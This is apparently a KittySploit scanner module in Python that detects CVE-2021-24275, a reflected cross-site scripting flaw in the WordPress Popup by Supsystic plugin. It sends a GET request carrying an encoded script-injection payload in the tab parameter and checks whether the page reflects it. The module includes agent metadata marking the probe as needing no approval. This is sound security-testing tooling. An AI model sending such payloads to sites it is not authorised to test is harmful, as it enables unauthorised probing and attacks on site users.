#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress Popup by Supsystic before 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Popup by Supsystic <1.10.5 - Cross-Site scripting Detection',
        'description': 'WordPress Popup by Supsystic before 1.10.5 did not sanitize the tab parameter of its options page before outputting it in an attribute, leading to a reflected cross-site scripting issue.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2021', 'wpscan', 'packetstorm', 'wordpress', 'wp-plugin', 'supsystic', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/efdc76e0-c14a-4baf-af70-9d381107308f',
            'http://packetstormsecurity.com/files/164311/WordPress-Popup-1.10.4-Cross-Site-Scripting.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-24275',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2021-24275',
    }

    def run(self):
        r = self.http_request(method="GET", path='/wp-admin/admin.php?page=popup-wp-supsystic&tab=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('</script><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Popup by Supsystic <1.10.5 - Cross-Site scripting detected",
                path='/wp-admin/admin.php?page=popup-wp-supsystic&tab=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E',
            )
            return True
        return False

